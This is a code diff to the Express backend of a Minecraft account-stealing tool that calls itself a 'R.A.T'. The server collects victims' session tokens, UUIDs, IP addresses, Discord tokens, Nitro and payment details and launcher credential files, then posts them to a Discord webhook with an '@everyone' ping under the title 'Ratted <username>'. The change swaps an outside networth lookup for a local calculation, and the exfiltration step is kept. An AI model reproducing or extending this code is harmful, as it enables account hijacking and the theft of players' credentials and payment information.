@@ -91,16 +91,12 @@ app.post("/", (req, res) => {
             }
 
             if (usingDiscord) {
+                // initialize networth variables
+                let networth = "0";
+                let soulboundnetworth = "0";
+                let sentnetworth = 0;
+                let description = "No profile data found. 🙁";
                 
-                //get networth
-                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
-
-                //check if has profiles, if api off or if normal
-                let total_networth
-                if (networth == null) total_networth = `[NW] No profile data found [NW]`
-                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-                else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
@@ -149,28 +145,46 @@ app.post("/", (req, res) => {
                 else
                     checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
 
+                
+                
                 //send to discord webhook
-                post(process.env.WEBHOOK, JSON.stringify({
-                    content: `@everyone - ${total_networth}`, //ping
-                    embeds: [{
-                        title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
-                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                        color: 5814783,
-                        footer: {
-                            "text": "R.A.T by dxxxxy",
-                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
-                        },
-                        timestamp: new Date()
-                    }],
-                    attachments: []
-                }), {
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                }).catch(err => {
-                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                })
+                networthCalc(uuid).then((result) => {
+                    networth = Intl.NumberFormat('en-US', {
+                        notation: 'compact',
+                        maximumFractionDigits: 2,
+                    }).format(result[0]);
+                    soulboundnetworth = Intl.NumberFormat('en-US', {
+                        notation: 'compact',
+                        maximumFractionDigits: 2,
+                    }).format(result[1]);
+                    description = result[2];
+                
+                    sentnetworth = (Math.trunc(result[0])) / 1000000;
+                
+                    post(process.env.WEBHOOK, JSON.stringify({
+                        content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
+                        embeds: [{
+                            title: `Ratted ${req.body.username} - Click For Stats`,
+                            description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
+                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
+                            color: 5814783,
+                            footer: {
+                                "text": "R.A.T by dxxxxy",
+                                "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
+                            },
+                            timestamp: new Date()
+                        }],
+                        attachments: []
+                    }), {
+                        headers: {
+                            "Content-Type": "application/json"
+                        }
+                    }).catch(err => {
+                        console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+                    })
+
+                });
+
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
